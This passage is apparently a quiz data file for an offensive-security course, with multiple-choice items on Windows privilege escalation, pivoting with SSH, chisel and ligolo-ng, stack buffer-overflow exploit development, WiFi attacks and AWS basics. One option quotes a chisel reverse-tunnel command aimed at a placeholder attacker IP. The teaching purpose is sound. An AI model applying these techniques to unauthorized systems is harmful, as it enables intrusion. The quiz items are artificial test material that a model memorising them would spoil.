          "That systeminfo shows a recent patch level",
          "That whoami /priv shows SeImpersonatePrivilege enabled",
          "That AlwaysInstallElevated is set in the registry",
          "That a scheduled task is writable",
        ],
        correctIndex: 1,
        explanation:
          "All three Potato-family tools abuse SeImpersonatePrivilege, so confirming it's enabled via whoami /priv is the practical precondition check before trying any of them.",
      },
    ],
  },
  {
    topicId: "m17-5",
    questions: [
      {
        question:
          "You find a scheduled task running as SYSTEM whose target script sits in a directory you can write to. What's the correct exploitation approach?",
        options: [
          "Modify the scheduled task's trigger time so it runs sooner",
          "Overwrite the script the task already points to, then wait for or force the trigger — you don't need to touch the scheduler itself",
          "Delete the task and recreate it with your own binary",
          "This can only be exploited if the task is also unquoted",
        ],
        correctIndex: 1,
        explanation:
          "A writable scheduled-task target is exploited the same way as an unquoted service path: replace what will already run, since the scheduler configuration itself doesn't need to change.",
      },
      {
        question:
          "Why must a DLL-hijack payload export the exact same function names as the legitimate DLL it replaces?",
        options: [
          "Otherwise Windows Defender blocks the load automatically",
          "Because the search order ignores exported function names entirely",
          "Because the loading process will crash instead of running the payload if the exports don't match",
          "Exported function names only matter for 64-bit DLLs",
        ],
        correctIndex: 2,
        explanation:
          "The process that imports the DLL expects specific exported functions to exist; if the malicious DLL doesn't provide them, the process crashes instead of executing the payload.",
      },
      {
        question:
          "What does filtering Process Monitor output on 'NAME NOT FOUND' for paths ending in .dll reveal?",
        options: [
          "Every DLL currently loaded by every running process",
          "Which DLLs a target process searched for but failed to find in an earlier, writable directory — candidates for hijacking",
          "Which scheduled tasks are misconfigured",
          "The service ACL for a given process",
        ],
        correctIndex: 1,
        explanation:
          "A 'NAME NOT FOUND' result on a .dll lookup means the process searched a directory for that DLL and didn't find it there, exposing exactly which load attempts a hijack DLL could intercept.",
      },
    ],
  },
  {
    topicId: "m17-6",
    questions: [
      {
        question:
          "You want to route nmap, curl, and a browser all through a single pivot host without hardcoding one destination. Which SSH forwarding mode fits?",
        options: [
          "Local forwarding (ssh -L)",
          "Remote forwarding (ssh -R)",
          "Dynamic forwarding (ssh -D), which turns your machine into a SOCKS proxy for use with proxychains",
          "None — SSH cannot forward more than one connection at a time",
        ],
        correctIndex: 2,
        explanation:
          "Dynamic forwarding (-D) creates a full SOCKS proxy that any SOCKS-aware tool, or anything wrapped in proxychains, can use to reach anything the jump box can reach — not just one predefined destination.",
      },
      {
        question:
          "You need a service on your attacking machine (e.g. a payload callback listener) to be reachable from the target's internal network through the jump box. Which mode?",
        options: [
          "Local forwarding (ssh -L)",
          "Remote forwarding (ssh -R), which exposes a port on the jump box that forwards back to your machine",
          "Dynamic forwarding (ssh -D)",
          "This requires a separate VPN, SSH cannot do this",
        ],
        correctIndex: 1,
        explanation:
          "Remote forwarding (-R) opens a port on the jump box side that forwards back to a service on your own machine, which is exactly what's needed for the internal network to reach a callback listener.",
      },
      {
        question:
          "You set up ssh -R on a jump box but the forwarded port is only reachable from localhost on that jump box, not from other hosts on its network. What sshd_config setting fixes this?",
        options: [
          "PermitRootLogin yes",
          "GatewayPorts yes",
          "PasswordAuthentication yes",
          "X11Forwarding yes",
        ],
        correctIndex: 1,
        explanation:
          "By default a remote-forwarded port only binds to localhost on the server; GatewayPorts yes is required for it to be reachable from other hosts on the jump box's network.",
      },
    ],
  },
  {
    topicId: "m17-7",
    questions: [
      {
        question:
          "A Windows-only pivot host has no SSH server, but outbound HTTPS is allowed through the firewall. Which tool is designed for exactly this situation?",
        options: [
          "ligolo-ng, because it requires a tun interface on the pivot host",
          "chisel, a single static Go binary that tunnels TCP/UDP over HTTP",
          "proxychains, since it can create tunnels on its own",
          "GatewayPorts yes must be set instead",
        ],
        correctIndex: 1,
        explanation:
          "chisel compiles to a single static binary for Windows and Linux and tunnels over HTTP, making it far more likely to survive an egress firewall than raw SSH on a host with no SSH server.",
      },
      {
        question:
          "Why does ligolo-ng avoid the need to configure every individual tool to speak SOCKS?",
        options: [
          "It disables the target's firewall entirely",
          "It only works with tools that already support SOCKS natively",
          "Its proxy/agent model adds a real tun interface with a route into the target subnet, so tools work transparently",
          "It tunnels exclusively over ICMP",
        ],
        correctIndex: 2,
        explanation:
          "Unlike a SOCKS proxy that every tool must be told to use, ligolo-ng's attacker-side tun interface with a routed subnet makes any tool work against that subnet with no per-tool configuration.",
      },
      {
        question:
          "Why would you use chisel's 'reverse' mode (chisel client <attacker_ip>:8000 R:socks) instead of a plain forward connection?",
        options: [
          "Reverse mode encrypts traffic while forward mode does not",
          "It matters when the pivot host can reach out to the attacker but the attacker can't reach in — the common real-world direction",
          "Reverse mode is required for UDP tunneling only",
          "It is only needed when ligolo-ng is unavailable",
        ],
        correctIndex: 1,
        explanation:
          "Reverse mode has the pivot host's client connect out to the attacker's chisel server, which fits the common scenario where the attacker cannot initiate a connection inbound to the pivot host.",
      },
    ],
  },
  {
    topicId: "m17-8",
    questions: [
      {
        question:
          "You run proxychains nmap -sS -Pn <target> through a pivot and it fails to produce useful results. Why does the SYN scan (-sS) generally not work through proxychains?",
        options: [
          "proxychains can only wrap standard socket connect() calls, not raw packet crafting",
          "SYN scans are blocked by dynamic_chain specifically",
          "proxychains only supports UDP-based scans",
          "-sS requires a strict_chain configuration",
        ],
        correctIndex: 0,
        explanation:
          "proxychains intercepts standard connect() calls, so TCP connect scans (-sT) work through it, but SYN scans need raw packet crafting that proxychains can't intercept.",
      },
      {
        question:
          "Why is -Pn typically added to an nmap command run through proxychains?",
        options: [
          "Because ICMP host-discovery pings don't route through a SOCKS proxy",
          "Because -Pn disables all TCP scanning",
          "Because proxychains requires -Pn to load its config file",
          "Because -Pn forces the scan to use UDP only",
        ],
        correctIndex: 0,
        explanation:
          "nmap's default host discovery relies on ICMP, which doesn't traverse a SOCKS proxy, so -Pn skips discovery and scans the target's ports directly.",
      },
      {
        question:
          "What is the practical difference between dynamic_chain and strict_chain in proxychains.conf when chaining multiple proxies?",
        options: [
          "strict_chain encrypts traffic, dynamic_chain does not",
          "dynamic_chain skips a dead proxy in the chain rather than failing outright, unlike strict_chain",
          "They are two names for the same behavior",
          "dynamic_chain only supports one proxy, strict_chain supports many",
        ],
        correctIndex: 1,
        explanation:
          "With dynamic_chain, proxychains can skip over a proxy in the chain that's down; strict_chain requires every hop to succeed in order or the connection fails.",
      },
    ],
  },
  {
    topicId: "m17-9",
    questions: [
      {
        question:
          "Before assuming an internal segment is reachable from a compromised beachhead at all, what should you check first?",
        options: [
          "The beachhead's own network configuration (ipconfig /all, route print, arp -a)",
          "Whether AlwaysInstallElevated is set on the attacking machine",
          "Whether proxychains is installed on the beachhead",
          "The CLSID list for the target OS build",
        ],
        correctIndex: 0,
        explanation:
          "The pivot can only reach what the beachhead itself can reach, so enumerating its network config first is necessary before assuming any target segment is even reachable.",
      },
      {
        question:
          "What counts as concrete proof that a pivot into an internal segment actually works?",
        options: [
          "Successfully escalating to SYSTEM on the beachhead",
          "Demonstrating access to something unreachable without the pivot, such as a host-discovery or port-scan result the attacking machine could never produce directly",
          "Confirming whoami /priv shows SeImpersonatePrivilege",
          "Confirming the chisel binary was uploaded successfully",
        ],
        correctIndex: 1,
        explanation:
          "SYSTEM access and tool uploads are prerequisites, but the pivot is only proven once it produces evidence — like a discovered host — that couldn't have come from the attacking machine directly.",
      },
      {
        question:
          "Does the specific privesc vector found on a beachhead (e.g. unquoted service path vs. AlwaysInstallElevated) determine which pivot tool should be used afterward?",
        options: [
          "Yes, unquoted-path privesc always pairs with SSH tunneling",
          "Yes, AlwaysInstallElevated always requires ligolo-ng",
          "No — privesc vector and pivot tool are independent choices, each driven by what's actually available on the host",
          "No, because pivoting is never possible after a registry-based privesc",
        ],
        correctIndex: 2,
        explanation:
          "Which privesc vector is present has no bearing on which pivot tool comes next; both are separately determined by what's actually available on that specific host.",
      },
    ],
  },
  {
    topicId: "m18-1",
    questions: [
      {
        question:
          "Why does writing more bytes into a fixed-size stack buffer with strcpy() or gets() corrupt adjacent memory instead of just failing safely?",
        options: [
          "The stack grows upward and immediately collides with the heap",
          "strcpy()/gets() perform no bounds checking, so the write simply continues into whatever memory sits above the buffer",
          "The compiler automatically truncates any input longer than the buffer",
          "RAM is volatile, so excess bytes are silently discarded",
        ],
        correctIndex: 1,
        explanation:
          "strcpy()/gets() write with no bounds checking, so bytes past the buffer's declared size overflow into adjacent stack memory.",
      },
      {
        question:
          "In the typical x86 frame layout [buffer][other locals][saved EBP][return address], what gets overwritten last as an overflow grows, and why does that matter most?",
        options: [
          "The saved return address, because that value is what the CPU jumps to when the function returns",
          "The function's arguments, because they execute before the return address is read",
          "The saved EBP only, since the return address sits below it and is unreachable",
          "The buffer itself, which resets automatically once overflowed",
        ],
        correctIndex: 0,
        explanation:
          "The return address is overwritten last as the overflow grows, and since it's what the CPU jumps to on return, controlling it means controlling execution flow.",
      },
      {
        question:
          "Why is this technique specifically called a 'stack-based' buffer overflow?",
        options: [
          "It only works on programs that explicitly use a stack data structure in their source code",
          "It overflows the CPU's internal instruction stack rather than memory",
          "The overwritten data, including eventually the return address, all lives on the stack, as opposed to heap-based corruption",
          "It targets the heap allocator's internal call stack",
        ],
        correctIndex: 2,
        explanation:
          "The corrupted data - locals, saved EBP, and return address - all resides on the stack, distinguishing it from heap-based memory corruption.",
      },
    ],
  },
  {
    topicId: "m18-2",
    questions: [
      {
        question:
          "When a fuzzed service crashes with EIP reading exactly 0x41414141, what has actually been confirmed?",
        options: [
          "The exact byte offset needed for the final exploit buffer",
          "That the target has no bad characters anywhere in its input handling",
          "That the overflow reached and overwrote the saved return address, within only a rough size range",
          "That DEP and ASLR are both disabled on the target",
        ],
        correctIndex: 2,
        explanation:
          "EIP == 0x41414141 confirms the return address was overwritten, but fuzzing only narrows the crash to a rough range, not an exact offset.",
      },
      {
        question:
          "Why does the fuzzing step require an attached debugger like Immunity Debugger on the target?",
        options: [
          "To automatically calculate the exact offset for the exploit",
          "To observe register state, such as EIP, at the moment the service crashes",
          "To generate the final shellcode payload",
          "To bypass ASLR during the fuzzing run",
        ],
        correctIndex: 1,
        explanation:
          "Without an attached debugger there is no way to see whether or how the crash corrupted registers like EIP.",
      },
      {
        question:
          "Fuzzing narrows a crash to somewhere between 300 and 400 injected bytes. What is the correct next step, based on how this methodology is described?",
        options: [
          "Assume 350 bytes is close enough and send the final exploit buffer",
          "Run msfvenom immediately to generate shellcode for that range",
          "Use a cyclic pattern to resolve the exact offset within that range, since fuzzing output is deliberately coarse",
          "Begin bad character analysis using the 300-400 byte range as the offset",
        ],
        correctIndex: 2,
        explanation:
          "Fuzzing only produces a rough range; the next step is generating a cyclic pattern to pinpoint the exact offset.",
      },
    ],
  },
  {
    topicId: "m18-3",
    questions: [
      {
        question:
          "Why can a cyclic (De Bruijn) pattern reveal an exact offset where a string of repeated 'A' characters cannot?",
        options: [
          "It is always shorter than an equivalent string of 'A's",
          "It disables ASLR for the duration of the crash",
          "Every 4-byte window within the pattern is unique, so whatever ends up in EIP can be looked up to reveal exactly where it came from",
          "It always produces a pattern exactly 524 bytes long",
        ],
        correctIndex: 2,
        explanation:
          "Because every window in a De Bruijn pattern is unique, the 4 bytes captured in EIP map to one specific position, giving an exact offset.",
      },
      {
        question:
          "After sending a cyclic pattern, EIP now contains 0x386F4337 instead of 0x41414141. What does this indicate?",
        options: [
          "The exploit has already achieved code execution",
          "The target has bad characters at that specific offset",
          "The buffer length was miscalculated and the whole process must restart from fuzzing",
          "Those 4 bytes were lifted directly from an identifiable spot in the pattern, which pattern_offset.rb can resolve to an exact offset",
        ],
        correctIndex: 3,
        explanation:
          "A pattern-derived value in EIP (rather than 0x41414141) means the crash landed inside the unique cyclic pattern, letting pattern_offset.rb pinpoint the offset.",
      },
      {
        question:
          "pattern_offset.rb reports 'exact match at offset 524.' What does this mean for building the exploit buffer?",
        options: [
          "Exactly 524 bytes total are needed for the whole exploit, no more",
          "Bytes 0 through 523 are padding, and bytes 524 through 527 land precisely in the saved return address",
          "The shellcode itself must begin at byte 524",
          "The bad-character exclusion list contains 524 entries",
        ],
        correctIndex: 1,
        explanation:
          "An offset of 524 means 524 bytes of padding precede the 4 bytes that overwrite the saved return address.",
      },
    ],
  },
  {
    topicId: "m18-4",
    questions: [
      {
        question:
          "Why is a distinct marker like 'BBBB' sent at this stage instead of jumping straight to shellcode?",
        options: [
          "'BBBB' is required syntax that msfvenom expects in every payload",
          "Shellcode cannot be sent until DEP is confirmed disabled",
          "EIP can only ever hold printable ASCII values",
          "To confirm the offset from the previous step is exactly right by checking that EIP reads precisely 0x42424242",
        ],
        correctIndex: 3,
        explanation:
          "Seeing EIP overwritten with exactly the chosen marker value proves the offset is correct before building anything further on top of it.",
      },
      {
        question:
          "What does placing a block of 'C' characters immediately after the EIP-overwriting marker verify?",
        options: [
          "That the target is specifically running Immunity Debugger",
          "That the offset calculated earlier was actually wrong",
          "That the remaining part of the buffer survives intact past the overwrite, confirming usable space for shellcode later",
          "That ASLR is disabled on the target module",
        ],
        correctIndex: 2,
        explanation:
          "The third marker confirms that bytes after the EIP overwrite are not lost or corrupted, meaning that space can later hold shellcode.",
      },
      {
        question:
          "Why does it matter where ESP points at the exact moment of the crash?",
        options: [
          "ESP determines which bytes are treated as bad characters",
          "ESP must be numerically equal to EIP for the exploit to succeed",
          "ESP always points back to the original, unmodified return address",
          "ESP typically points into the attacker-controlled buffer space that will eventually hold the shellcode",
        ],
        correctIndex: 3,
        explanation:
          "ESP at crash time usually points into the surviving part of the buffer, which is why a JMP ESP redirect lands execution in the shellcode.",
      },
    ],
  },
  {
    topicId: "m18-5",
    questions: [
      {
        question:
          "Why is bad character testing repeated iteratively, removing confirmed-bad bytes and resending the rest, rather than done in a single pass?",
        options: [
          "mona.py can only test 16 bytes of the range at a time",
          "A single bad byte can corrupt everything after it in the buffer, hiding whether later bytes are also bad",
          "The debugger resets its memory view after every test",
          "ASLR changes which byte values are bad on each run",
        ],
        correctIndex: 1,
        explanation:
          "Because one bad byte can corrupt the bytes that follow it in memory, the test must be repeated after removing known-bad bytes to get an accurate full list.",
      },
      {
        question:
          "Why is 0x00 almost always treated as a bad character in this kind of exploit?",
        options: [
          "It is the first byte of every JMP ESP instruction",
          "It always matches the chosen EIP marker value",
          "msfvenom refuses to generate any payload containing it",
          "It terminates C strings, so anything after it in the buffer gets cut off",
        ],
        correctIndex: 3,
        explanation:
          "0x00 is a null terminator in C strings, so it truncates the buffer at that point and corrupts everything meant to follow it.",
      },
      {
        question:
          "How is a specific byte value actually determined to be 'bad' during this analysis?",
        options: [
          "By checking whether the byte alone crashes the fuzzer",
          "By checking whether the byte is printable ASCII",
          "By comparing the bytes that were sent against what actually appears in the target's memory - missing or altered bytes are bad",
          "By checking whether msfvenom's default payload happens to include it",
        ],
        correctIndex: 2,
        explanation:
          "Bad characters are identified by a byte-for-byte comparison between the sent 0x00-0xFF block and what actually shows up in target memory.",
      },
    ],
  },
  {
    topicId: "m18-6",
    questions: [
      {
        question:
          "Why doesn't controlling EIP alone guarantee execution lands in your shellcode?",
        options: [
          "EIP can only be overwritten with NOP instructions",
          "You typically don't know the shellcode's exact absolute stack address in advance, so EIP needs a reliable pivot like JMP ESP instead",
          "Shellcode must be encoded directly inside the EIP value itself",
          "Any EIP overwrite automatically triggers DEP",
        ],
        correctIndex: 1,
        explanation:
          "Without knowing the shellcode's absolute address, EIP is pointed at a JMP ESP instruction instead, which reliably redirects to wherever ESP is at that moment.",
      },
      {
        question:
          "Why must the module supplying the JMP ESP address load at the same, predictable base address on every run?",
        options: [
          "ASLR randomizes a module's base address per run, so a hardcoded address from an ASLR-enabled module won't work reliably again",
          "Non-ASLR modules automatically also disable DEP",
          "JMP ESP instructions only exist inside non-ASLR modules",
          "A predictable base address changes which bytes are bad characters",
        ],
        correctIndex: 0,
        explanation:
          "ASLR randomizes module base addresses on each run, so a JMP ESP address hardcoded from an ASLR-enabled module would no longer point to the same instruction next time.",
      },
      {
        question:
          "Even with a correct JMP ESP address, why does DEP defeat this specific technique?",
        options: [
          "DEP removes the JMP ESP instruction from memory entirely",
          "DEP randomizes EIP on every function call",
          "DEP requires the exploit to have a working ROP chain before finding bad characters",
          "DEP marks the stack memory non-executable, so even a successful jump onto the shellcode there fails to run it",
        ],
        correctIndex: 3,
        explanation:
          "DEP prevents code on the stack from executing at all, so landing on shellcode there via JMP ESP no longer results in execution - modern bypasses use ROP instead.",
      },
    ],
  },
  {
    topicId: "m18-7",
    questions: [
      {
        question:
          "Why is a NOP sled placed immediately before the shellcode rather than relying on JMP ESP to land exactly on its first byte?",
        options: [
          "NOP sleds exempt the shellcode from bad-character restrictions",
          "msfvenom will not compile shellcode without a NOP sled present",
          "The jump's exact landing point can be slightly imprecise, and sliding through NOPs is far more forgiving than needing byte-exact alignment",
          "NOP sleds disable ASLR for the remainder of the exploit",
        ],
        correctIndex: 2,
        explanation:
          "A NOP sled gives landing-zone tolerance, since JMP ESP may not land on the exact first byte of shellcode every time.",
      },
      {
        question:
          "Why is the bad-character list from earlier passed into msfvenom's -b flag when generating shellcode?",
        options: [
          "So the generated shellcode automatically bypasses DEP",
          "So the payload shrinks to fit under the discovered offset",
          "So ASLR is disabled specifically during payload generation",
          "So the generated shellcode never contains a byte that would corrupt it in transit through the vulnerable input",
        ],
        correctIndex: 3,
        explanation:
          "Excluding known bad characters ensures the shellcode itself won't be truncated or altered by the same filtering that affected earlier test bytes.",
      },
      {
        question:
          "Why must the JMP ESP return address bytes be arranged in little-endian order within the exploit buffer?",
        options: [
          "To avoid accidentally including the bad character 0x00",
          "To match how x86 reads multi-byte values off the stack",
          "So the address fits entirely inside the NOP sled",
          "Because msfvenom only accepts little-endian shellcode as input",
        ],
        correctIndex: 1,
        explanation:
          "x86 reads addresses off the stack in little-endian order, so the return-address bytes must be arranged that way to be interpreted correctly.",
      },
    ],
  },
  {
    topicId: "m18-8",
    questions: [
      {
        question:
          "What is the correct order of this module's exploit development methodology?",
        options: [
          "Fuzz -> cyclic pattern for exact offset -> confirm EIP control -> bad character analysis -> find a JMP ESP -> generate shellcode with NOP sled -> deliver buffer",
          "Bad character analysis -> fuzz -> find JMP ESP -> confirm EIP control -> generate shellcode -> cyclic pattern for offset",
          "Generate shellcode -> fuzz -> find JMP ESP -> confirm EIP control -> cyclic pattern for offset -> bad character analysis",
          "Find JMP ESP -> fuzz -> generate shellcode -> confirm EIP control -> cyclic pattern for offset -> bad character analysis",
        ],
        correctIndex: 0,
        explanation:
          "The methodology runs fuzz, then exact offset via cyclic pattern, then confirmed EIP control, then bad characters, then JMP ESP, then shellcode delivery.",
      },
      {
        question:
          "Which mitigation specifically defeats the JMP ESP step, rather than blocking shellcode execution outright?",
        options: [
          "Stack canaries",
          "DEP",
          "ASLR, because it randomizes module base addresses so a hardcoded JMP ESP address is no longer reliable",
          "Bad character filtering",
        ],
        correctIndex: 2,
        explanation:
          "ASLR breaks the JMP ESP step by randomizing the base address of the module the address was found in, while DEP is what blocks execution on the stack itself.",
      },
      {
        question:
          "Why does an early mistake, such as a wrong offset, invalidate the entire exploit chain rather than just that one step?",
        options: [
          "msfvenom automatically detects and corrects upstream mistakes",
          "Each step's output is a required input to the next, so an error early on breaks everything built downstream",
          "The debugger resets the bad-character list whenever an error occurs",
          "DEP only activates specifically when the offset is wrong",
        ],
        correctIndex: 1,
        explanation:
          "Because each stage feeds directly into the next (offset into EIP control, bad chars into shellcode generation, and so on), an early error propagates through the whole chain.",
      },
    ],
  },
  {
    topicId: "m19-1",
    questions: [
      {
        question:
          "What is the key difference between managed mode and monitor mode for a WiFi adapter?",
        options: [
          "Managed mode requires a paid driver license; monitor mode does not",
          "Managed mode only processes frames addressed to it after associating with one network; monitor mode passively captures all 802.11 frames on a channel regardless of destination or association",
          "Monitor mode only works on 5GHz bands while managed mode works on both",
          "Monitor mode encrypts captured frames automatically for later analysis",
        ],
        correctIndex: 1,
        explanation:
          "Managed mode filters to frames addressed to the associated network, while monitor mode strips that filtering away and captures everything on the channel.",
      },
      {
        question: "What distinguishes a BSSID from an ESSID?",
        options: [
          "ESSID is the AP radio's actual MAC address; BSSID is the human-readable network name",
          "They are two names for exactly the same value",
          "BSSID is the AP radio's actual MAC address and the true unique identifier; ESSID is the human-readable network name that multiple BSSIDs (e.g. mesh APs) can share",
          "BSSID changes every time a beacon frame is sent",
        ],
        correctIndex: 2,
        explanation:
          "BSSID uniquely identifies one specific radio's MAC address, while ESSID is the shared human-readable name that several BSSIDs can advertise at once.",
      },
      {
        question:
          "Beyond monitor mode, what additional adapter capability is required to send deauthentication frames and actively force a handshake?",
        options: [
          "A higher transmit power setting only",
          "Packet injection, a chipset/driver-dependent capability most built-in laptop WiFi cards lack, which is why a dedicated USB adapter is standard kit",
          "A 5GHz-only radio",
          "Root access to the access point itself",
        ],
        correctIndex: 1,
        explanation:
          "Forcing new traffic like deauths requires packet injection support, which is gated by chipset/driver and absent from most built-in laptop cards.",
      },
    ],
  },
  {
    topicId: "m19-2",
    questions: [
      {
        question: "Why is WEP crackable given enough captured traffic?",
        options: [
          "Its 24-bit IV space is small enough that IVs repeat quickly, leaking information about the RC4 keystream that can be recovered statistically",
          "It uses no encryption at all",
          "It requires the attacker to already know the passphrase",
          "It transmits the full WEP key in plaintext in every frame",
        ],
        correctIndex: 0,
        explanation:
          "WEP's small IV space causes frequent IV reuse, which leaks enough about the RC4 keystream to recover the key statistically, without brute force.",
      },
      {
        question:
          "Is WEP's IV-reuse weakness a misconfiguration or a design flaw?",
        options: [
          "A misconfiguration that can be fixed by choosing a longer WEP key",
          "A bug limited to one specific vendor's firmware",
          "A fundamental weakness in WEP's protocol design that no amount of correct configuration can fix",
          "An issue only relevant to WEP networks with fewer than 10 clients",
        ],
        correctIndex: 2,
        explanation:
          "The IV-reuse flaw is baked into WEP's protocol design itself, not a configuration mistake, which is why it can't be patched by using WEP 'correctly'.",
      },
      {
        question: "How did WPA/WPA2 fix the problem that broke WEP?",
        options: [
          "By increasing the IV size to 48 bits while keeping a static key",
          "By deriving a unique per-session key through a handshake instead of reusing a static key with a short IV",
          "By switching from RC4 to a stronger IV-free cipher while still using a static key",
          "By removing encryption from wireless frames entirely",
        ],
        correctIndex: 1,
        explanation:
          "WPA/WPA2 discard WEP's static-key-plus-short-IV scheme entirely, deriving a fresh per-session key through the 4-way handshake instead.",
      },
    ],
  },
  {
    topicId: "m19-3",
    questions: [
      {
        question:
          "What does the PBKDF2 derivation using the PSK and SSID actually produce, and does it ever cross the air?",
        options: [
          "The PTK, which is broadcast in every beacon frame",
          "The PMK (Pairwise Master Key), which is derived independently on both sides and never transmitted over the air",
          "The MIC, which is sent in cleartext during association",
          "The ANonce, which is broadcast continuously",
        ],
        correctIndex: 1,
        explanation:
          "PBKDF2 over the PSK and SSID produces the PMK on both the client and AP independently; the PMK itself is never sent over the air.",
      },
      {
        question:
          "In the 4-way handshake, what happens in Message 1 versus Message 2?",
        options: [
          "Message 1: the AP sends the ANonce; Message 2: the client returns its SNonce plus a MIC after deriving the PTK",
          "Message 1: the client sends the passphrase; Message 2: the AP confirms it",
          "Message 1: the AP installs the keys; Message 2: the client sends the ANonce",
          "Message 1 and Message 2 are identical acknowledgements with no data exchanged",
        ],
        correctIndex: 0,
        explanation:
          "The AP starts by sending its ANonce (Message 1), then the client derives the PTK and replies with its SNonce and a MIC (Message 2).",
      },
      {
        question:
          "Why is capturing the 4-way handshake necessary before any offline WPA2 crack attempt?",
        options: [
          "It contains the plaintext passphrase directly",
          "It disables the AP's encryption temporarily",
          "It provides the nonces and a MIC value that a guessed passphrase's re-derived PMK/PTK can be checked against, since the PMK itself is never transmitted",
          "It is not actually necessary; any captured beacon frame works the same way",
        ],
        correctIndex: 2,
        explanation:
          "The handshake yields nonces and a MIC to test candidate passphrases against offline; it never reveals the passphrase or PMK directly.",
      },
    ],
  },
  {
    topicId: "m19-4",
    questions: [
      {
        question:
          "Why is airodump-ng run twice — first with no filters, then locked to a channel and BSSID?",
        options: [
          "The first run is only cosmetic and has no functional purpose",
          "Locking to a channel/BSSID is required by law",
          "The unfiltered run surveys the whole band to identify and confirm the target; the locked run then captures only that target's traffic, avoiding noise from unrelated networks",
          "The first run captures the handshake and the second is only for reporting",
        ],
        correctIndex: 2,
        explanation:
          "The broad scan identifies and confirms the target BSSID/channel, then the locked capture focuses only on that target, avoiding unrelated traffic.",
      },
      {
        question:
          "What does aireplay-ng's deauthentication attack actually do?",
        options: [
          "It sends spoofed deauth frames appearing to come from the AP, forcing an already-connected client to disconnect and reassociate, which regenerates the 4-way handshake",
          "It brute-forces the WPA2 passphrase directly over the air",
          "It permanently disables the target AP",
          "It converts a captured handshake into hashcat format",
        ],
        correctIndex: 0,
        explanation:
          "The deauth attack spoofs disconnect frames from the AP, prompting the client to reassociate and regenerate the 4-way handshake in the clear.",
      },
      {
        question:
          "Under what condition will a deauth-based handshake capture attempt fail regardless of how many deauth frames are sent?",
        options: [
          "If the AP is using WPA2 instead of WPA",
          "If the adapter is in managed mode instead of monitor mode during the deauth itself",
          "If there is no client currently connected to the target AP, since there's nothing to force a handshake from",
          "If the ESSID contains special characters",
        ],
        correctIndex: 2,
        explanation:
          "Deauth only works against a network with at least one already-connected client; an AP with no clients has nothing to force a handshake from.",
      },
    ],
  },
  {
    topicId: "m19-5",
    questions: [
      {
        question:
          "What ultimately determines whether an offline crack against a captured handshake succeeds?",
        options: [
          "Whether the real passphrase appears in the wordlist supplied — compute power alone cannot overcome an absent entry",
          "The GPU model used, regardless of wordlist content",
          "The number of deauth frames sent during capture",
          "The length of the ESSID",
        ],
        correctIndex: 0,
        explanation:
          "Success depends entirely on wordlist coverage; if the real passphrase isn't in the list, no amount of compute power will find it.",
      },
      {
        question:
          "What must be done before a captured handshake can be cracked with hashcat?",
        options: [
          "Nothing — hashcat reads .cap files natively",
          "The .cap file must be converted, typically with hcxpcapngtool, into a hashcat-compatible hash format",
          "The handshake must first be cracked with aircrack-ng to confirm it is valid",
          "The wordlist must be converted to hexadecimal",
        ],
        correctIndex: 1,
        explanation:
          "hashcat requires the capture to be converted first, typically with hcxpcapngtool from the hcxtools project, into its own hash format.",
      },
      {
        question: "How does hashcat mode 22000 relate to the older mode 2500?",
        options: [
          "2500 is the current mode and 22000 is deprecated",
          "They are unrelated modes for entirely different protocols",
          "22000 is the current, unified mode for WPA-PBKDF2-PMKID+EAPOL, superseding the older mode 2500 used for classic EAPOL handshake captures",
          "22000 only works with WEP captures",
        ],
        correctIndex: 2,
        explanation:
          "Mode 22000 is the current unified mode covering handshake and PMKID-based captures, having superseded the older EAPOL-only mode 2500.",
      },
    ],
  },
  {
    topicId: "m19-6",
    questions: [
      {
        question:
          "Why is the WPS PIN's effective keyspace far smaller than its 8 digits suggest?",
        options: [
          "The 8th digit is a checksum of the first 7, and many APs validate the PIN in two separate halves (4 digits, then 3 plus checksum), acknowledging each independently and collapsing the real search space to roughly 10^4 + 10^3 guesses",
          "WPS PINs are always set to 00000000 by default",
          "The PIN is transmitted in plaintext in every beacon frame",
          "WPS uses only 4 digits total, not 8",
        ],
        correctIndex: 0,
        explanation:
          "The checksum digit plus two-stage half validation collapses the true 10^7 keyspace down to roughly 10^4 + 10^3 feasible guesses.",
      },
      {
        question:
          "Once reaver or bully recovers the full WPS PIN, what happens next?",
        options: [
          "The attacker must still run a full dictionary attack against the handshake",
          "WPS hands back the AP's actual configured WPA2 passphrase directly, with no wordlist or handshake cracking required",
          "The AP automatically resets to factory defaults",
          "Nothing further can be recovered — the PIN itself is the only output",
        ],
        correctIndex: 1,
        explanation:
          "Recovering the full PIN lets WPS hand back the AP's actual configured WPA2 passphrase, bypassing wordlist or handshake cracking entirely.",
      },
      {
        question:
          "Under what conditions does a reaver/bully WPS attack fail outright?",
        options: [
          "Only if the AP is broadcasting on 5GHz",
          "Only if the client device is turned off",
          "Against an AP with WPS disabled, or one that implements lockout/rate-limiting after repeated failed PIN attempts",
          "It never fails once monitor mode is enabled",
        ],
        correctIndex: 2,
        explanation:
          "The attack fails completely against an AP with WPS disabled, or one with proper lockout/rate-limiting after repeated failed attempts.",
      },
    ],
  },
  {
    topicId: "m19-7",
    questions: [
      {
        question: "What does an Evil Twin attack fundamentally exploit?",
        options: [
          "A cryptographic weakness in the WPA2 4-way handshake",
          "The fact that 802.11 clients generally trust an ESSID by name rather than cryptographically verifying which physical AP they're really talking to",
          "A flaw in the WPS PIN checksum algorithm",
          "IV reuse in RC4 keystream generation",
        ],
        correctIndex: 1,
        explanation:
          "Evil Twin attacks exploit clients trusting an ESSID by name rather than verifying the actual physical AP cryptographically, not a protocol weakness.",
      },
      {
        question:
          "How does the attacker actually obtain credentials in an Evil Twin attack?",
        options: [
          "By cracking the captured handshake offline with hashcat",
          "By recovering the WPS PIN with reaver",
          "Via a captive portal (fake login or firmware-update page) presented once the victim connects to the cloned AP, which logs whatever they type in",
          "By exploiting IV reuse in the rogue AP's RC4 stream",
        ],
        correctIndex: 2,
        explanation:
          "Once connected to the clone, a captive portal asks the victim directly for the passphrase or credentials, which the attacker simply logs.",
      },
      {
        question:
          "Which tools automate the rogue AP setup, deauth, and captive portal delivery for an Evil Twin attack?",
        options: [
          "aircrack-ng and hashcat",
          "reaver and bully",
          "hcxpcapngtool and wash",
          "airgeddon and wifiphisher",
        ],
        correctIndex: 3,
        explanation:
          "airgeddon and wifiphisher automate the rogue AP setup, deauth, and captive portal delivery as an integrated Evil Twin workflow.",
      },
    ],
  },
  {
    topicId: "m20-1",
    questions: [
      {
        question:
          "In AWS's shared-responsibility framing, what does 'security of the cloud' refer to?",
        options: [
          "The provider's responsibility for physical data centers, hardware, and host hypervisor",
          "The customer's IAM configuration and data encryption choices",
          "A joint audit performed once a year",
          "The end user's device antivirus software",
        ],
        correctIndex: 0,
